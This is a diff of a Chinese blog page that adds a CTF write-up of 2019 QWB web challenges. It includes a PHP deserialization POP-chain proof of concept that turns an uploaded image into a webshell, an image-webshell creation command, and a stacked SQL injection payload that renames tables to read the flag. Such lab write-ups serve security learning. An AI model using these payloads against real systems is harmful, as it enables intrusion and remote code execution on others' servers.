@@ -81,18 +81,21 @@
 
 
 
-<meta name="description" content="UPLOAD 打开靶机，有登陆和注册的页面 注册登陆，进入到一个上传页面 测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png  随便注">
+<meta name="description" content="平台：https://buuoj.cn/challenges UPLOAD 打开靶机，有登陆和注册的页面  注册登陆，进入到一个上传页面  测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下  敏感文件扫描，发现是 /www.tar.gz 泄露，将源码下载，是 ThinkPHP 5 的框架  函数流程：  没有登陆时，跳转到 index.php">
 <meta name="keywords" content="wp,QWB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="强网杯web复现">
 <meta property="og:url" content="http://yoursite.com/2019/06/05/2019强网杯web复现/index.html">
 <meta property="og:site_name" content="peri0d的博客">
-<meta property="og:description" content="UPLOAD 打开靶机，有登陆和注册的页面 注册登陆，进入到一个上传页面 测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png  随便注">
+<meta property="og:description" content="平台：https://buuoj.cn/challenges UPLOAD 打开靶机，有登陆和注册的页面  注册登陆，进入到一个上传页面  测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下  敏感文件扫描，发现是 /www.tar.gz 泄露，将源码下载，是 ThinkPHP 5 的框架  函数流程：  没有登陆时，跳转到 index.php">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-06-05T11:21:46.047Z">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png">
+<meta property="og:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png">
+<meta property="og:updated_time" content="2019-06-09T08:30:56.666Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="强网杯web复现">
-<meta name="twitter:description" content="UPLOAD 打开靶机，有登陆和注册的页面 注册登陆，进入到一个上传页面 测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png  随便注">
+<meta name="twitter:description" content="平台：https://buuoj.cn/challenges UPLOAD 打开靶机，有登陆和注册的页面  注册登陆，进入到一个上传页面  测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下  敏感文件扫描，发现是 /www.tar.gz 泄露，将源码下载，是 ThinkPHP 5 的框架  函数流程：  没有登陆时，跳转到 index.php">
+<meta name="twitter:image" content="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png">
 
 
 
@@ -364,12 +367,66 @@
       
 
       
-        <h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><ol>
-<li>打开靶机，有登陆和注册的页面</li>
-<li>注册登陆，进入到一个上传页面</li>
-<li>测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png</li>
+        <p>平台：<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p>
+<h1 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h1><ol>
+<li><p>打开靶机，有登陆和注册的页面</p>
+</li>
+<li><p>注册登陆，进入到一个上传页面</p>
+</li>
+<li><p>测试了一下，只能上传正常的图片，非 png 格式会自动转化为 png，图片被保存在 upload 目录下</p>
+</li>
+<li><p>敏感文件扫描，发现是 /<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 泄露，将源码下载，是 ThinkPHP 5 的框架</p>
+</li>
+<li><p>函数流程：</p>
+<ol>
+<li>没有登陆时，跳转到 index.php，进行注册登陆。login_check 函数将 cookie(‘user’) 赋给 profile，然后 base64 解码反序列化</li>
+<li>在注册页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行注册</li>
+<li>在登陆页面调用 login_check 函数检查是否登陆，是则跳转到 index.php/home ，否则进行登陆</li>
+<li>已经登陆时，跳转到 index.php/home 进行文件上传操作</li>
+<li>在进行上传操作时，对请求头中的 REMOTE_ADDR 进行 md5 加密并赋给 upload_menu ，然后创建以 upload_menu 命名的文件夹</li>
+<li>然后进行登陆检查，然后将文件的临时副本的名称赋给 filename_tmp，将文件名(不加后缀)进行 md5 加密后赋给 filename</li>
+<li>然后进行后缀检测，将 filename 的后缀赋给 ext，如果 ext 为 png 返回 1，否则返回 0</li>
+<li>如果后缀是 png，检查图片内容，然后将 filename 赋给 filename_tmp，将图片相对路径赋给 img，执行 update_img 函数</li>
+<li>update_img 函数先进行 user 查询，如果 user 没有上传过图片并且 img 存在，则更新 user 表的 img 字段，<br>并执行 update_cookie 函数</li>
+<li>update_cookie 函数将上传图片的 img 进行序列化和 base64 编码后赋给 cookie 的 user</li>
+<li>profile 的 _call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。<br>_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。</li>
 </ol>
-<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1>
+</li>
+<li><p>蚁剑生成 shell，再用 <code>copy 1.png /b + 2.php /a 3.png</code> 生成图片马，注册个新号上传，其中 1.png 是正常图片，2.php 是 shell，3.png 是合成的</p>
+</li>
+<li><p>构造一个 profile 和 register 类，命名空间 app\web\controller。然后给 except 赋值 [‘index’ =&gt; ‘img’]，如果访问 index 就会返回 img，而后给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。然后给 filename_tmp 和 filename 赋值，程序 filename_tmp 移动到 filename，这样就可以把后缀改为 php 了。</p>
+<p>后面构造的 register，checker 赋值为 $profile，$register 赋值为 false，这样对象析构时就会调用 profile 的 index 方法，再转到 upload_img</p>
+</li>
+<li><p>最终 poc 如下，修改 cookie 刷新，然后蚁剑连接 shell 即可</p>
+</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$profile = <span class="keyword">new</span> Profile();</span><br><span class="line">$profile-&gt;except = [<span class="string">'index'</span> =&gt; <span class="string">'img'</span>];</span><br><span class="line">$profile-&gt;img = <span class="string">"upload_img"</span>;</span><br><span class="line">$profile-&gt;ext = <span class="string">"png"</span>;</span><br><span class="line"></span><br><span class="line">$profile-&gt;filename_tmp = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/364be8860e8d72b4358b5e88099a935a.png"</span>;</span><br><span class="line">$profile-&gt;filename = <span class="string">"../public/upload/24ff17b3e72d90d210f3455327ea52f7/364be8860e8d72b4358b5e88099a935a.php"</span>;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register();</span><br><span class="line">$register-&gt;registed = <span class="keyword">false</span>;</span><br><span class="line">$register-&gt;checker = $profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><ol>
+<li><p>打开靶机，随便提交，发现似乎是把 PHP 查询的原始结果之间返回了</p>
+</li>
+<li><p>输入 select 发现了过滤语句，过滤了 select，update，delete，drop，insert，where 和 . </p>
+<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
+</li>
+<li><p>测试一下有没有注入。<code>?inject=1&#39;%23</code>，返回正常，字符型注入</p>
+</li>
+<li><p>过滤了这么多关键词，尝试堆叠注入。<code>?inject=1&#39;;show databases;%23</code>，看到了所有的数据库</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_1.png" alt></p>
+</li>
+<li><p>再看一下所有的表。<code>?inject=1&#39;;show tables;%23</code>，1919810931114514 表和 words 表</p>
+<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/buuctf/qwb_supersql_2.png" alt></p>
+</li>
+<li><p>flag 在全数字的表里，默认查询的是 words 表</p>
+</li>
+<li><p>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了</p>
+</li>
+<li><p>构造 payload 如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1&apos;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用  <code>/?inject=1&#39; or &#39;1&#39;=&#39;1</code> 访问一下即可获得 flag</p>
+</li>
+</ol>
+<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1>
       
     </div>
     
@@ -410,6 +467,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/10/SQL注入总结/" rel="prev" title="SQL 注入">
+                SQL 注入 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -488,7 +549,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -510,7 +571,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -550,7 +611,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UPLOAD"><span class="nav-number">1.</span> <span class="nav-text">UPLOAD</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#随便注"><span class="nav-number">2.</span> <span class="nav-text">随便注</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#UPLOAD"><span class="nav-number">1.</span> <span class="nav-text">UPLOAD</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#随便注"><span class="nav-number">2.</span> <span class="nav-text">随便注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#高明的黑客"><span class="nav-number">3.</span> <span class="nav-text">高明的黑客</span></a></li></ol></div>
             
 
           </div>
